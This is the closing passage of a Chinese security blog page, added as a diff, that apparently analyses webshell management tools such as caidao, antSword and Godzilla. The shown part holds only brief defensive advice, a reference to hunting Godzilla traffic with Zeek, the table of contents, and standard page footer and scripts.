+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211003255149.png" alt="image-20220211003255149"></p>
+<h2 id="0x06-综合防御"><a href="#0x06-综合防御" class="headerlink" title="0x06 综合防御"></a>0x06 综合防御</h2><p>1、收敛网站权限</p>
+<p>2、在数据通道、控制通道和流量侧部署相关企业级产品</p>
+<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p>安全客 -《巧用Zeek在流量层狩猎哥斯拉Godzilla》</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-caidao"><span class="toc-number">2.</span> <span class="toc-text">0x01 caidao</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">2.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7"><span class="toc-number">2.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-weevely"><span class="toc-number">3.</span> <span class="toc-text">0x02 weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-1"><span class="toc-number">3.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-1"><span class="toc-number">3.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-1"><span class="toc-number">3.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-antSword"><span class="toc-number">4.</span> <span class="toc-text">0x03 antSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-2"><span class="toc-number">4.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-2"><span class="toc-number">4.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-2"><span class="toc-number">4.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-rebeyond"><span class="toc-number">5.</span> <span class="toc-text">0x04 rebeyond</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-3"><span class="toc-number">5.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-3"><span class="toc-number">5.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-3"><span class="toc-number">5.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Godzilla"><span class="toc-number">6.</span> <span class="toc-text">0x05 Godzilla</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-4"><span class="toc-number">6.1.</span> <span class="toc-text">1、配置使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-4"><span class="toc-number">6.2.</span> <span class="toc-text">2、流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A3%80%E6%B5%8B%E6%8A%80%E5%B7%A7-4"><span class="toc-number">6.3.</span> <span class="toc-text">3、检测技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%BC%E5%90%88%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">0x06 综合防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&text=常见webshell管理工具的分析记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&is_video=false&description=常见webshell管理工具的分析记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=常见webshell管理工具的分析记录&body=Check out this article: https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&title=常见webshell管理工具的分析记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&name=常见webshell管理工具的分析记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/&t=常见webshell管理工具的分析记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
